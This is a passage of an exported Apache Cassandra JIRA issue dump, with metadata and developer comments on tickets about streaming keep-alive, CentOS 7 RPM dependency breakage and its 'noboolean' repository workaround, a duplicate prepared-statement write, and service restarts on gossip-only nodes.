If the property should not be used anymore, we need to deprecate it and fix the error message as it is misleading.

[~benedict] , [~samt] , [~aleksey] , can you, please, check and take care of this one as authors of that patch?

Thank you in advance!",,aleksey,benedict,bereng,e.dimitrova,jmckenzie,mck,paulo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17737,,,,,,,,,,CASSANDRA-16927,,,,,,CASSANDRA-11841,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,aleksey,mck,,,,,,,,,,,,,Correctness,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Nov 09 11:06:09 UTC 2022,,,,,,,All,,,,"0|z172j4:",9223372036854775807,,,,bereng,mck,,,Normal,,4.1-alpha1,,https://github.com/apache/cassandra/commit/c100d34a1a1d497eee85ca10c5cc1e43eb4871c4,,,,,,,,,"CI: unit, dtest, dtest-upgrade",,,,,"22/Jul/22 01:19;paulo;Nice catch [~e.dimitrova]! Can we clarify if {{streaming_keep_alive_period}} is no longer needed to keep long-lived cross-dc connections active? I remember the reason this was added was due to idle connections being reset and causing streaming to fail after an inactivity period (since we used one inbound and another outbound connection for streaming, so one direction could stay idle while the other was active), not sure if this is still a potential issue after CEP-10.;;;","22/Jul/22 08:50;benedict;I think it was always unused, since we specify keep alive at the TCP layer. Or, potentially we did not at some point previously specify keep alive at the TCP layer, but by the time of the refactor we certainly did.;;;","22/Jul/22 12:08;aleksey;I'll take care of this is, assuming there is something to be done here.;;;","23/Jul/22 12:35;benedict;So, looking back, TCP layer keep alive was being specified back when this patch was introduced. But perhaps it wasn't in an earlier build that encountered this behaviour? There's no discussion on the original ticket around why TCP layer keep alive wasn't working.

So far 4.0 has been running without application layer keep alive, seemingly just fine. Do we have any evidence this is still needed, [~paulo]?;;;","25/Jul/22 14:47;paulo;I think the original problem CASSANDRA-11841 was intended to solve is when operators are using networks/firewalls they have little/no control of (ie. cloud/vpn providers), and can't set recommended net.ipv4.tcp_keepalive* settings. The idea is to have an app-layer keep-alive to ensure we don't depend on network settings to keep long-lived cross-datacenter connections alive.

This is certainly a niche feature, but I don't know if it's still useful or not.

A few pointers to conextualize the use-case being addressed by that setting:
 - CASSANDRA-12830
 - [https://www.mail-archive.com/user@cassandra.apache.org/msg54529.html]
 - [https://docs.datastax.com/en/archived/cassandra/2.0/cassandra/troubleshooting/trblshootIdleFirewall.html];;;","25/Jul/22 14:55;paulo;fwiw I don't object removing this if we think this is no longer required, as long as we give proper notice in a NEWS.txt entry.;;;","25/Jul/22 15:11;paulo;I think the necessity for this is significantly reduced if we use a single connection for both inbound/outbound streaming traffic, but that was not the case when the feature was added, so one connection could remain idle for long periods while the other side was active, what caused connection resets due to badly configured firewalls/networks.

From [https://docs.oracle.com/cd/E19787-01/820-2559/using-24/index.html:]
{quote}Where possible, in addition to using the TCP keep-alive mechanism, the client application also must perform its own periodic keep-alive at its level. *The TCP keep-alive mechanism is not perfect in all possible boundary cases.*
{quote};;;","25/Jul/22 15:12;e.dimitrova;(Removing will be breaking change, talking from experience, so please, deprecate only but I agree we need to update NEWS.txt and cassandra.yaml plus clean that logging, at least, if we take the deprecation road :D );;;","25/Jul/22 15:16;paulo;It seems like TCP keep-alives are an optional feature, what might explain why it doesn't work in some cases.

From [https://www.freesoft.org/CIE/RFC/1122/114.htm:]
{quote}Implementors MAY include ""keep-alives"" in their TCP implementations, although this practice is not universally accepted.
{quote};;;","25/Jul/22 22:11;benedict;Thanks for the additional context, Paulo. It sounds like this should be maintained, but perhaps as a netty-layer keep alive, rather than a streaming-specific one.;;;","26/Jul/22 14:32;paulo;bq. It sounds like this should be maintained, but perhaps as a netty-layer keep alive, rather than a streaming-specific one.

Good idea to move it to the netty layer. I wonder if this would be enabled just for streaming, or for other paths as well? Perhaps we could make this opt-out for streaming? This way users would have a way to rely just on TCP keep-alives when the network supports it.;;;","26/Jul/22 14:35;benedict;I think it makes sense to make it opt-in, probably separately for streaming and regular connections. There's no point wasting application time on this if the network layer is known to provide it (and, generally, it does);;;","01/Nov/22 13:46;aleksey;So here is my current thinking on this, in particular in context of this blocking RC1.

Technically speaking, yes, this is a regression. 4.0 *does* trigger application-level keep-alive at this set interval, and 4.1 no longer does.

In 4.1, {{KeepAliveMessage}} still exists, its handler/serializer logic is still intact. If a 4.1 node receives a {{KeepAliveMessage}}, it won't choke, and handle it just fine. But the code to send these at the configured interval is gone.

I suggest we un-deprecate the param, but set the default to 0, making it opt-in. I also suggest that we bring back the logic to issue these (streaming) roughly as it was originally. That said, I'm not sure this is significant enough to block RC1, given that it can be brought back without any compatibility issue in any minor 4.1 release, whenever we so desire.;;;","01/Nov/22 14:26;mck;+1 to moving fixVersion from 4.1-rc to 4.1.x;;;","01/Nov/22 14:59;jmckenzie;Chatting w/Mick offline about this. I'm a little concerned about folks running in environments w/insufficient or weird TCP_KEEPALIVE that might not realize it until they upgrade to 4.1 and start having streams / channels that get killed for inactivity.

While it's certainly redundant in a world w/expected tcp env, and less of a concern on a single channel vs. the older paradigm, what's the downside to us reinstating the {{KeepAliveTask}} scheduling code from 4.0 in 4.1 defaulted to on? I have to assume the volume of messaging from this would be negligible and historically channels getting closed for inactivity has been a niggling annoyance for us, so a little redundancy in this area of our communications would be welcome IMO.;;;","01/Nov/22 17:27;aleksey;bq. What's the downside to us reinstating the KeepAliveTask scheduling code from 4.0 in 4.1 defaulted to on?

Honestly, there is really no downside, it's a tiny message once every 5 minutes by default. I'd just rather not handle this myself at the moment, and I'm not sure the issue itself justifies blocking the RC, given relative unimportance and the relative ease of reinstating at any point, including in a minor.

If we feel strongly that it just cannot wait until 4.1.1 at all, I'll make it happen, but this isn't as trivial as copy-pasting some 4.0 code back, post refactor, and testing + committing is going to take some time.;;;","02/Nov/22 15:50;jmckenzie;For sure; totally respect the lack of time to do this right now + relative ease of reinstating.

Maybe we hit up the dev list about it and see if anyone feels strongly about this; we have a lot of folks that are both devs and operators at scale who might be able to offer some insight. Could very well be a non-issue period, or fine to push to a point release.;;;","08/Nov/22 07:44;mck;Patch
- 4.1 https://github.com/apache/cassandra/compare/cassandra-4.1...thelastpickle:cassandra:mck/17768/4.1

CI
- ASF https://ci-cassandra.apache.org/job/Cassandra-devbranch/2066/
- circleci https://app.circleci.com/pipelines/github/michaelsembwever/cassandra?branch=mck%2F17768%2F4.1;;;","08/Nov/22 10:27;bereng;^I checked the new code vs the pre CEP-10 code and they are the same. Circle looks good and assuming jenkins is green, which there's no reason it shouldn't +1 from me (side note: multiplexer for modified tests didn't work this time but it shouldn't be a blocker imo, investigating);;;","08/Nov/22 12:59;bereng;So the auto multiplexing didn't run bc of CASSANDRA-18024. I got a patch from Mick's branch and I am running circle ci again [here|https://app.circleci.com/pipelines/github/bereng/cassandra/803/workflows/c55e6efa-7afc-41e4-a9e4-9fec3bce0d42] for my [branch|https://github.com/bereng/cassandra/pull/new/CASSANDRA-17768-4.1];;;","09/Nov/22 10:33;mck;Note, the new Messaging System (4.0) [does not|https://issues.apache.org/jira/browse/CASSANDRA-15066?focusedCommentId=16801284&page=com.atlassian.jira.plugin.system.issuetabpanels%3Acomment-tabpanel#comment-16801284] support mix-version (by [MS versions|https://github.com/apache/cassandra/blob/cassandra-4.0/src/java/org/apache/cassandra/net/MessagingService.java#L201]) streaming [anymore|https://github.com/apache/cassandra/blob/cassandra-4.0/src/java/org/apache/cassandra/net/InboundConnectionInitiator.java#L298-L305].;;;","09/Nov/22 11:06;mck;Committed as [c100d34a1a1d497eee85ca10c5cc1e43eb4871c4|https://github.com/apache/cassandra/commit/c100d34a1a1d497eee85ca10c5cc1e43eb4871c4].;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
RPM Installation on centos 7 is broken by CASSANDRA-17669,CASSANDRA-17765,13472721,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,jjordan,jjordan,21/Jul/22 16:13,17/Nov/22 15:22,13/Jul/23 08:40,28/Oct/22 13:14,4.0.6,4.1,4.1-beta1,,,,Packaging,,,,0,,"With CASSANDRA-17669 adding use of ""or"" in the dependencies for the RPM so it can depend on java 8 or java 11 it broke installation on CentOS Linux 7.  This is bad because CentOS Linux 7 is the ""current"" release of CentOS Linux, version 8 was EOL'ed in favor of the new pre-release distribution model being used for CentOS Stream 8.

I don't know what the best answer is here, maybe making a CentOS 7 specific package that reverts back to just java 8 in the requirements?  But I think should needs to be done.",,amit_patel,bbonnet,BrandonBordeaux,e.dimitrova,FST,jjordan,maedhroz,mck,steve.lacerda@datastax.com,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17791,,,,,,CASSANDRA-17669,,CASSANDRA-17880,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17766,CASSANDRA-17766,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Packaging -> Package Distribution,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Nov 17 15:22:44 UTC 2022,,,,,,,All,,,,"0|z1723c:",9223372036854775807,,,,mck,,,,Normal,,4.0.5,,https://github.com/apache/cassandra/commit/3b49283ef9049b35e41313081a2d2777cc0f2067,,,,,,,,,run CI,,,,,"22/Jul/22 17:56;brandon.williams;The critical feature we can delineate distros with is [boolean dependencies|https://rpm-software-management.github.io/rpm/manual/boolean_dependencies.html], added first in rpm 4.13 (centos7 sadly has 4.11-3.)   Those that have boolean deps are solved by CASSANDRA-17669 and can use either java 8 or java 11 to satisfy its requirements.  For distros that lack this, I think we have to publish another repo with the pre-17669 spec that depends on java 8, essentially putting them back in the world they were in before.  They'll need to either float a java 8 and java 11 installation to use 11, or issue --nodeps to bypass the java 8 requirement.  Making both java 8 and java 11 binary packages is odd: typically a package only has one set of dependencies, and we would have two with same name and different dependencies, or we'd have to introduce a different package name, and either option seems fairly undesirable.;;;","22/Jul/22 18:06;jjordan;I think a different repo for centos7 that just keeps the 4.0.4 and earlier status quo of the package requiring java 8 is reasonable.;;;","26/Jul/22 15:47;brandon.williams;||Branch||Jenkins||
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17765-4.0]|[!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1852/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1852/pipeline]|
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17765-4.1]|[!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1853/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1853/pipeline]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17765-trunk]|[!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1854/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1854/pipeline]|

Patches to create a 'noboolean' subdirectory with everything symlinked except the spec file, which depends on j8 only.  We'll need to commit these first to test the machinery in CASSANDRA-17766 since those scripts are married to the official repo.
;;;","06/Aug/22 21:00;mck;I missed the 7 not being EOL'd, mea culpa.

Should we add a README in to the redhat/noboolean directory?

Will we still need the 'noboolean' repo and subdirectory when we drop support for j8 (and add a newer jX)?
Are we ok adding symlinks into git? (I guess so as we don't expect windows users, even if they are just reading the source, to be caring about these files)
;;;","07/Aug/22 13:45;brandon.williams;I'll add a README for the noboolean dir.  We'll need the noboolean packages until there are no distros we'd like to support that use an rpmlib older than 4.13, since we'll probably always want boolean support in the packaging going forward with multiple java versions (j8 or not.)

I too have a hard time seeing a windows user interested in linux packages, but it's not like symlinks would really prevent them from doing anything if they had the motivation.;;;","08/Aug/22 15:09;amit_patel;Hi We are facing the similar issue on RHEL7 as well , we have java8 installed on the system but when I tried to install yum install cassandra or even localinstall(downloaded rpm) gives similar error as below .

 

yum localinstall cassandra-4.0.5-1.noarch.rpm
Loaded plugins: product-id, search-disabled-repos, subscription-manager
Examining cassandra-4.0.5-1.noarch.rpm: cassandra-4.0.5-1.noarch
Marking cassandra-4.0.5-1.noarch.rpm to be installed
Resolving Dependencies
--> Running transaction check
---> Package cassandra.noarch 0:4.0.5-1 will be installed
*Error: Invalid version flag: or*;;;","09/Aug/22 09:13;amit_patel;Is there any other repositories I can use for 4.0.x ?  As currently 4.0.5 available on the repo which has issue? How can I install previous stable version of 4.0.x ? 

[Index of /cassandra/redhat/40x (apache.org)|https://downloads.apache.org/cassandra/redhat/40x/]   (repo rpm packages) has only 4.0.5 which is broken and replace with the stable version?

Also might need to update on installation documentation as well. Under Installing the RPM packages

[Installing Cassandra | Apache Cassandra Documentation|https://cassandra.apache.org/doc/latest/cassandra/getting_started/installing.html#installing-the-rpm-packages]

Can you please guide how can I install the stable version?;;;","09/Aug/22 10:58;brandon.williams;You should take this question to the user ML since Jira is not a good support vehicle, and this is really a question about how to use your distro's package manager.  That said, a search for ""yum install specific version"" will likely yield the results you seek.;;;","09/Aug/22 12:40;amit_patel;Thanks Brandon,

Raised on ML;;;","11/Aug/22 21:39;mck;+1 ;;;","12/Aug/22 13:36;brandon.williams;Committed, thanks.;;;","28/Oct/22 13:06;FST;Hi,

This problem seems well fixed in 4.0.6 but reappeared in 4.0.7
{noformat}
[root@wtyb0106 cassandra_rpms]# rpm -qp cassandra-4.0.5-1.noarch.rpm --requires | grep jre
(jre-1.8.0 or jre-11){noformat}
{noformat}
[root@wtyb0106 cassandra_rpms]# rpm -qp cassandra-4.0.6-1.noarch.rpm --requires | grep jre
jre >= 1.8.0{noformat}
{noformat}
[root@wtyb0106 cassandra_rpms]# rpm -qp cassandra-4.0.7-1.noarch.rpm --requires | grep jre
(jre-1.8.0 or jre-11){noformat}
Regards,

Florent;;;","28/Oct/22 13:14;brandon.williams;You have downloaded the wrong RPM and need to use the one in the 'noboolean' directory.

{noformat}
$ rpm -qpf --requires cassandra-4.0.7-1.noarch.rpm
warning: cassandra-4.0.7-1.noarch.rpm.1: Header V4 RSA/SHA256 Signature, key ID 7e3e87cb: NOKEY
jre >= 1.8.0

$ md5sum cassandra-4.0.7-1.noarch.rpm
0d4dc0605e704c147a081e7b029be3e5  cassandra-4.0.7-1.noarch.rpm
{noformat};;;","28/Oct/22 14:02;FST;Hi Brandon, thanks for your answer.

The RPM was provided by customer on a local repository so I'm not sure how he got it.

However, I just tried to add the official repository on a sandbox VM (https://cassandra.apache.org/_/download.html):
{noformat}
# cat <<EOF > /etc/yum.repos.d/cassandra.repo
[cassandra]
name=Apache Cassandra
baseurl=https://redhat.cassandra.apache.org/40x/
gpgcheck=1
repo_gpgcheck=1
gpgkey=https://downloads.apache.org/cassandra/KEYS
EOF{noformat}
{noformat}
# yum install cassandra
[...]
Resolving Dependencies
--> Running transaction check
---> Package cassandra.noarch 0:4.0.7-1 will be installed
Error: Invalid version flag: or{noformat}
{noformat}
# yumdownloader cassandra
# rpm -qpf --requires cassandra-4.0.7-1.noarch.rpm | grep jre
warning: cassandra-4.0.7-1.noarch.rpm: Header V4 RSA/SHA256 Signature, key ID 7e3e87cb: NOKEY
(jre-1.8.0 or jre-11){noformat}
Indeed, it's not the same rpm you mentionned:
{noformat}
# md5sum cassandra-4.0.7-1.noarch.rpm
2b5f85e027caee7e41419f3cb9e21c67  cassandra-4.0.7-1.noarch.rpm{noformat}
But how can we got the ""noboolean"" from the repository?

(Because of https://issues.apache.org/jira/browse/INFRA-23802, it's not very convenient to explore the repository);;;","28/Oct/22 14:06;brandon.williams;The noboolean repo is at https://redhat.cassandra.apache.org/40x/noboolean/ :);;;","28/Oct/22 14:13;FST;Perfect! Many thanks.;;;","17/Nov/22 13:41;bbonnet;Hi,

please reopen since issue is back with version 4.0.7.;;;","17/Nov/22 13:47;brandon.williams;You probably have the wrong package, please check the comments on this ticket.

{noformat}
$ wget https://apache.jfrog.io/artifactory/cassandra-rpm/40x/noboolean/cassandra-4.0.7-1.noarch.rpm
...
$ rpm -qpR cassandra-4.0.7-1.noarch.rpm 
warning: cassandra-4.0.7-1.noarch.rpm: Header V4 RSA/SHA256 Signature, key ID 7e3e87cb: NOKEY
jre >= 1.8.0
python(abi) >= 3.6
procps-ng >= 3.3
user(cassandra)
group(cassandra)
shadow-utils
/bin/sh
/bin/sh
/bin/sh
rpmlib(FileDigests) <= 4.6.0-1
rpmlib(PayloadFilesHavePrefix) <= 4.0-1
rpmlib(CompressedFileNames) <= 3.0.4-1
rpmlib(PayloadIsXz) <= 5.2-1
{noformat}

[~bbonnet] where did you download your package from?;;;","17/Nov/22 15:15;bbonnet;Actually, I got the right one, following those comments, but in my opinion, finding the right way to install Cassandra on a Centos 7 should not require searching for Jira issues and downloading the package from an adhoc repository.  

Documentation (installation or troubleshooting section) should mention this work-around.;;;","17/Nov/22 15:22;brandon.williams;I don't disagree, opened CASSANDRA-18059 to document this ticket.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Extra writePreparedStatement call,CASSANDRA-17764,13472719,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,tjake,tjake,21/Jul/22 16:06,05/Oct/22 22:22,13/Jul/23 08:40,22/Jul/22 16:34,4.0.6,4.1,4.1-beta1,,,,Local/Caching,,,,0,,"There seems to be a double insert happening in QueryProcessor.storePreparedStatement()

 

[https://github.com/apache/cassandra/blob/ab9ab903fa590409251e97fe075e02a64c8aa4f3/src/java/org/apache/cassandra/cql3/QueryProcessor.java#L788-L791]

 

I think it's intended to only write to prepared statement  table when it's new to the cache vs every prepare call.  Regardless the extra one should be dropped.",,e.dimitrova,maedhroz,tjake,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jul 22 16:34:33 UTC 2022,,,,,,,All,,,,"0|z1722w:",9223372036854775807,,,,maedhroz,,,,Normal,,4.0,,https://github.com/apache/cassandra/commit/a53bb7ab82e3d176e2594d2076dd8bf1f224b60e,,,,,,,,,run CI,,,,,"21/Jul/22 16:37;brandon.williams;||Branch||Circle||
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17764-4.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/552/workflows/f36a189e-eadb-4dab-8185-fa1f09388446], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/552/workflows/4093179e-f232-4429-a0ff-9932fdf6ea82]|
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17764-4.1]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/549/workflows/ce1cf2d8-7e8e-4cbe-b533-ffe96ebe29bb], [J11|https://app.circleci.com/pipelines/github/driftx/cassandra/549/workflows/8b3af374-12b2-48a4-a9ab-18916a3b071c]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17764-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/551/workflows/ba8cadb9-025f-46f9-b663-69d9e956d30d], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/551/workflows/353e45a9-0c64-4871-9cb4-245a8279e031]|
;;;","21/Jul/22 20:50;maedhroz;+1 to all three branches, but it looks like we need a MID/HIGHRES CircleCI run for 4.1;;;","21/Jul/22 20:53;brandon.williams;Whoops, [j8|https://app.circleci.com/pipelines/github/driftx/cassandra/553/workflows/30e249ec-ac2c-4186-a27c-7e76baf6b83c], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/553/workflows/8999aa80-d7a8-4356-9630-61db41fd084a];;;","22/Jul/22 16:10;maedhroz;No idea what's up w/ {{testTpStats}}, but it shouldn't have anything to do w/ this patch...;;;","22/Jul/22 16:22;brandon.williams;I created CASSANDRA-17771 for it.;;;","22/Jul/22 16:34;brandon.williams;Committed, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"When bootstrap fails, CassandraRoleManager may attempt to do read queries that fail with ""Cannot read from a bootstrapping node"", and increments unavailables counters",CASSANDRA-17754,13471650,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,dcapwell,dcapwell,dcapwell,14/Jul/22 22:58,27/Jul/22 13:40,13/Jul/23 08:40,25/Jul/22 21:35,5.0,,,,,,Consistency/Bootstrap and Decommission,Feature/Authorization,,,0,,"If bootstrap fails we stay alive but avoid joining the ring.  CassandraRoleManager attempts to schedule its setup every 10 seconds, but this will fail due to Bootstrap being pending; the side effect to this is that readMetrics.unavailables gets incremented.

We should defer attempting to setup only after we know its safe to perform such as read",,dcapwell,samt,,,,,,,,,,,,,"smiklosovic closed pull request #1734: CASSANDRA-17754: When bootstrap fails, CassandraRoleManager may attempt to do read queries that fail with ""Cannot read from a bootstrapping node"", and increments unavailables counters
URL: https://github.com/apache/cassandra/pull/1734


;27/Jul/22 13:40;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,dcapwell,,,,,,,,,,,,,,Correctness -> Recoverable Corruption / Loss,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Jul 25 19:28:33 UTC 2022,,,,,,,All,,,,"0|z16vi0:",9223372036854775807,,,,samt,,,,Normal,,2.0.0,,https://github.com/apache/cassandra/commit/db3a29428df5f4e17791ce8a4e075532abb36667,,,,,,,,,added tests,,,,,"25/Jul/22 13:58;samt;LGTM, the one test failure is unrelated & I see what looks like another flake in the same fixture in Butler. ;;;","25/Jul/22 19:28;dcapwell;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|trunk|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17754-trunk-CBB57EA3-BB8C-4FDB-A76C-F1A0F212D4CD]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17754-trunk-CBB57EA3-BB8C-4FDB-A76C-F1A0F212D4CD]|[build|unknown]|
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fix restarting of services on gossipping-only members,CASSANDRA-17752,13471394,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,smiklosovic,smiklosovic,smiklosovic,13/Jul/22 11:47,05/Oct/22 22:22,13/Jul/23 08:40,27/Jul/22 13:32,3.0.28,3.11.14,4.0.6,4.1-beta1,5.0,,Legacy/Core,Tool/nodetool,,,0,,"When a node is started with -Dcassandra.join_ring=false, it is possible to talk to it via CQL. If we disable it via ""nodetool disablebinary"", it is not possible to enable it back with ""nodetool enablebinary"".

The reason why is that enablebinary command eventually calls ""StorageService#checkServiceAllowedToStart"" and it throws when:

1) the node is draining (which does not happen)
2) it is shutting down (which does not happen)
3) is not in NORMAL state - which happens.

The state of the gossipping-only member is STARTING for ever.

The check should make an exception here, like if it is in STARTING but -Dcassandra.join_ring=false, start it anyway.",,brandon.williams,smiklosovic,,,,,,,,,,,,,"smiklosovic closed pull request #1732: CASSANDRA-17752 fix restarting of services on gossipping-only member
URL: https://github.com/apache/cassandra/pull/1732


;27/Jul/22 13:40;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,smiklosovic,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,Adhoc Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Jul 26 15:24:00 UTC 2022,,,,,,,All,,,,"0|z16tx4:",9223372036854775807,,,,brandon.williams,,,,Normal,,3.0.10,,https://github.com/apache/cassandra/commit/a7b53217bda59f04c7266136614c3e79ac44d0c2,,,,,,,,,in-jvm dtests,,,,,"14/Jul/22 08:34;smiklosovic;https://github.com/apache/cassandra/pull/1732

I have renamed this ticket to describe this problem in broader sense. In the description of the ticket, I am dealing with native transport only.

There was also an idea to get rid of this check completely but I would rather leave it there for now, preserving the previous solution, I would just fix the restarting.

The problematic method is also called on these occasions:

1) start of gossip - this is interesting corner case, but I think it should be possible to stop and start gossipping on a gossipping only member
2) start of thrift - I do not see any reason why restarting of thrift on gossipping only member should fail
3) start of native transport
4) start of auto compaction - again, this is fairly innocent operation as that node does not hold any data anyway.

Fixing this will obviously fix respective enable/disable nodetool command combos.

I will provide all other branches & build once we agree on the approach.;;;","14/Jul/22 19:54;smiklosovic;build for 3.0 looks fine https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1827;;;","19/Jul/22 13:39;brandon.williams;Approach LGTM.;;;","26/Jul/22 15:15;smiklosovic;[~brandon.williams] I propose these branches to be merged based on the respective builds.

branches:

trunk [https://github.com/instaclustr/cassandra/tree/CASSANDRA-17752-trunk]
4.1 [https://github.com/instaclustr/cassandra/tree/CASSANDRA-17752-4.1]
4.0 [https://github.com/instaclustr/cassandra/tree/CASSANDRA-17752-4.0]
3.11 [https://github.com/instaclustr/cassandra/tree/CASSANDRA-17752-3.11]
3.0 [https://github.com/instaclustr/cassandra/tree/CASSANDRA-17752]

builds:

trunk [https://ci-cassandra.apache.org/job/Cassandra-devbranch/1851/]
4.1 [https://ci-cassandra.apache.org/job/Cassandra-devbranch/1849]
4.0 [https://ci-cassandra.apache.org/job/Cassandra-devbranch/1847]
3.11 [https://ci-cassandra.apache.org/job/Cassandra-devbranch/1848]
3.0 [https://ci-cassandra.apache.org/job/Cassandra-devbranch/1827];;;","26/Jul/22 15:24;brandon.williams;+1;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix flaky dtest - dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestUpgrade_indev_4_0_x_To_indev_4_1_x.test_bootstrap_multidc,CASSANDRA-17749,13471247,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,brandon.williams,brandon.williams,12/Jul/22 15:34,05/Oct/22 22:22,13/Jul/23 08:40,15/Jul/22 13:12,4.1,4.1-beta1,,,,,Test/dtest/python,,,,0,,"https://ci-cassandra.apache.org/job/Cassandra-4.1/93/testReport/dtest-upgrade.upgrade_tests.upgrade_through_versions_test/TestUpgrade_indev_4_0_x_To_indev_4_1_x/test_bootstrap_multidc/

Error Message

test teardown failure

Stacktrace

